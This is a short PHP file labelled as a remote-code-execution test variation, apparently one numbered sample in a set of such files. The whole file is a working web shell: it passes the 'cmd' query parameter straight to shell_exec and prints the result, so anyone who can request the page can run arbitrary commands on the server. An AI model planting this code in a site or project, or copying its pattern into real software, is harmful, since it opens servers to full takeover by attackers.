<?php
// RCE test variation #1387
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>